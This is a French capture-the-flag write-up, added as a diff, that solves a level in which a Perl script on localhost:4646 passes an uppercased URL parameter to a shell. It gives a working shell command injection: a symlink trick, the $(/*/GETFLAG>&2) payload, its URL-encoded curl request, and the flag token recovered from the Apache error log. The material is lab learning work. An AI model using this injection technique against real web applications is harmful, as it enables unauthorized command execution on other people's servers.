@@ -1,0 +1,29 @@
+il y a un server sur localhost 4646
+qui execute le code perl level12.pl
+
+le program level12.pl pred le contenue du parametre x de l'url donne
+met le contenue en majuscule
+et enleve tout ce qui est apres un espace
+et qui utilise le contenue du parametre x dans une commande shell
+
+on va essaye de faire une injection de commande shell pour avoir le flag
+
+on cree un lien symbolic sur getflag en majuscule pour ne pas avoir de minuscule dans le contenue du parametre x
+$> ln -s /bin/getflag /tmp/GETFLAG
+
+on met des $() pour execute en shell
+x=$()
+
+on rajoute le path vers le lien symbolic sur getflag /*/GETFLAG on utilise /*/ pour accede a /tmp
+x=$(/*/GETFLAG)
+
+comme on a acces au log du server /var/log/apache2/error.log on redirige la sortie de getflag vers la sortie d'erreur avec >&2
+x=$(/*/GETFLAG>&2)
+
+on convertie la commande $(/*/GETFLAG>&2) en url avec le site https://www.url-encode-decode.com/ pour evite les character comme & qui sont interprete dans l'url
+x=%24%28%2F%2A%2FGETFLAG%3E%262%29
+
+$> curl 'localhost:4646?x=%24%28%2F%2A%2FGETFLAG%3E%262%29'
+
+$> tail -n 1 /var/log/apache2/error.log
+[Fri Oct 22 19:05:37 2021] [error] [client 127.0.0.1] Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
